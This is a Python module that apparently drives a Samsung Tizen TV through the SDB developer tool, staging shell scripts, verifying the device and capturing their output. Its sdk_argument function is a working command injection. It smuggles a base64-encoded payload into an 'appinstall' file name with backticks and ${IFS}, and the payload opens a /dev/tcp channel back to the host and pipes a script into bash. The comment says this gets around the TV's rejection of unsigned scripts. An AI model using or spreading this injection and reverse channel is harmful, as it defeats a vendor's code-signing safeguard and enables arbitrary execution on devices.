"""Bounded SDK transport adapted from CleanFrame (MIT). No arbitrary-command CLI.

Capture stages one reviewed shell file, executes it once in SDK context and
removes that file on exit. Missing completion is uncertain, never retried.
"""
import base64
import ipaddress
import json
import os
from pathlib import Path
import re
import socket
import shlex
import time
import subprocess
import uuid
from urllib.request import urlopen

REMOTE='/home/owner/share/tmp/sdk_tools/'
MODEL='UN50AU8000GXZD'

def validate_device(info, local, expected_id):
    if (info.get('modelName') != MODEL or str(info.get('developerMode')) != '1'
            or info.get('developerIP') != local or not expected_id or info.get('id') != expected_id):
        raise ValueError('Model, physical identity or Developer Mode host mismatch; nothing executed.')

def sdk_argument(local, port, name):
    if not isinstance(ipaddress.ip_address(local),ipaddress.IPv4Address): raise ValueError('IPv4 required')
    if not isinstance(port,int) or not 1<=port<=65535: raise ValueError('Invalid callback port')
    if not re.fullmatch(r'vibe-preflight-[a-f0-9]{16}\.sh',name): raise ValueError('Invalid staged filename')
    # AU8000 UEP rejects executing an unsigned script path. The reviewed
    # CleanFrame transport feeds its content to bash through stdin.
    command='exec 3<>/dev/tcp/'+local+'/'+str(port)+';cat '+REMOTE+name+'|bash >&3 2>&3;exec 3>&-'
    encoded=base64.b64encode(command.encode()).decode()
    argument='0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}'+encoded+'|base64${IFS}-d|bash`.tpk'
    if len(argument.encode())>400: raise ValueError('SDK request exceeds reviewed size')
    return argument

def completed(output,token):
    marker='VIBE_RESULT:'+token+':'
    if output.count(marker)!=1 or not output.endswith(marker+'0\n'):
        raise RuntimeError('Remote failure or incomplete result; inspect state before another action. No retry performed.')
    return output[:output.index(marker)]

def wrap_script(script,remote,token):
    if not re.fullmatch('[a-f0-9]+',token): raise ValueError('Invalid completion token')
    path=shlex.quote(remote)
    return ("trap " + shlex.quote('rm -f '+path) + " EXIT\n(\n" + script + "\n)\nrc=$?\n"
            + 'if rm -f '+path+' && test ! -e '+path+'; then :; else rc=77; fi\n'
            + "trap - EXIT\nprintf '\\nVIBE_RESULT:"+token+":%s\\n' \"$rc\"\nexit \"$rc\"\n")

class Session:
    def __init__(self,host,private):
        os.umask(0o077)
        if not isinstance(ipaddress.ip_address(host),ipaddress.IPv4Address): raise ValueError('IPv4 required')
        self.host=host; self.serial=host+':26101'; self.private=Path(private).resolve()
        self.private.mkdir(parents=True,exist_ok=True,mode=0o700)
        self.sdk=Path.home()/'.tizen-extension-platform/server/sdktools/data/tools/sdb'
        if not self.sdk.is_file(): raise RuntimeError('Existing Samsung SDB is required')
        with socket.socket(socket.AF_INET,socket.SOCK_DGRAM) as route:
            route.connect((host,9));self.local=route.getsockname()[0]
        with urlopen('http://'+host+':8001/api/v2/',timeout=5) as response:info=json.load(response)['device']
        identity=self.private/'device.json'
        if not identity.exists(): raise ValueError('Missing previously confirmed private device identity')
        expected=json.loads(identity.read_text())['id']
        validate_device(info,self.local,expected)
        self.expected=expected
        self.run(['connect',self.serial])
    def run(self,args,timeout=15):
        result=subprocess.run([str(self.sdk),*args],capture_output=True,text=True,timeout=timeout)
        if result.returncode or re.search(r'(?im)^\s*error:',result.stdout+'\n'+result.stderr):
            raise RuntimeError('SDB operation failed: '+result.stderr[-200:]+result.stdout[-200:])
        return result.stdout
    def push(self,source,remote):return self.run(['-s',self.serial,'push',str(source),remote])
    def pull(self,remote,target):return self.run(['-s',self.serial,'pull',remote,str(target)])
    def capture(self,script,label,timeout=45):
        token=uuid.uuid4().hex[:16];name='vibe-preflight-'+token+'.sh'
        folder=self.private/(label+'-'+token);folder.mkdir(mode=0o700)
        localfile=folder/'command.sh'
        wrapped=wrap_script(script,REMOTE+name,token)
        localfile.write_text(wrapped)
        # Recheck the physical device before every upload/execution.
        with urlopen('http://'+self.host+':8001/api/v2/',timeout=5) as response:info=json.load(response)['device']
        validate_device(info,self.local,self.expected)
        deadline=time.monotonic()+timeout
        def remaining():
            left=deadline-time.monotonic()
            if left<=0: raise TimeoutError('Overall SDK callback deadline exceeded')
            return left
        chunks=[]
        with socket.socket() as listener:
            listener.bind((self.local,0));listener.listen(1);listener.settimeout(remaining())
            argument=sdk_argument(self.local,listener.getsockname()[1],name)
            self.push(localfile,REMOTE+name)
            proc=subprocess.Popen([str(self.sdk),'-s',self.serial,'shell',argument],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
            try:
                connection,peer=listener.accept()
                if peer[0]!=self.host:connection.close();raise RuntimeError('Unexpected callback peer')
                size=0
                with connection:
                    while True:
                        connection.settimeout(remaining())
                        chunk=connection.recv(16384)
                        if not chunk:break
                        size+=len(chunk)
                        if size>100000:raise RuntimeError('Unexpected diagnostic size')
                        chunks.append(chunk)
                output=b''.join(chunks).decode(errors='replace')
                (folder/'output.txt').write_text(output)
                try:stdout,stderr=proc.communicate(timeout=5)
                except subprocess.TimeoutExpired:proc.terminate();stdout,stderr=proc.communicate(timeout=3)
                (folder/'transport.json').write_text(json.dumps({'returncode':proc.returncode,'stdout':stdout,'stderr':stderr}))
                if proc.returncode not in (0,1):raise RuntimeError('Unconfirmed transport result; inspect saved evidence')
                return completed(output,token),folder
            except Exception as error:
                (folder/'partial-output.txt').write_bytes(b''.join(chunks))
                (folder/'error.txt').write_text(str(error))
                raise
            finally:
                if proc.poll() is None:proc.terminate();proc.communicate(timeout=3)
